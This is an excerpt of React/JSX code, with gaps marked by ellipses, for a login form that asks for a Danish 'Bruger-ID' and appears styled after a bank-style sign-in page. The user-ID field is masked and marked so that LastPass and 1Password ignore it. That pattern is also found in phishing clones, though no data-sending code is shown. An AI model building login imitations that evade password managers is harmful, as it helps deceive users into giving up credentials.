        ...
        <div className="flex flex-col lg:flex-row gap-[60px] max-w-[900px] w-full items-center lg:items-start">
          <CardShell>
            <form className="flex flex-col h-full" onSubmit={handleSubmit}>
              ...
              <div className="mb-5">
                <label className="flex items-center gap-1.5 text-[13px] font-bold text-[#001C44] tracking-wide mb-2.5 uppercase">
                  Bruger-ID
                ...
                <div className="relative">
                  <input type={showUserId ? 'text' : 'password'} value={userId} onChange={(e) => setUserId(e.target.value)}
                    ...
                    className="w-full border border-gray-300 rounded px-4 py-3.5 text-[15px] text-[#001C44] focus:outline-none focus:border-[#0055a5] focus:ring-1 focus:ring-[#0055a5] pr-14" autoComplete="one-time-code" inputMode="text" data-lpignore="true" data-1p-ignore="true" spellCheck={false} />
              ...
              <button type="submit" disabled={loading || !userId.trim()}
                className={`w-full font-bold text-[15px] py-3.5 px-4 rounded flex items-center justify-between cursor-pointer transition-colors ${
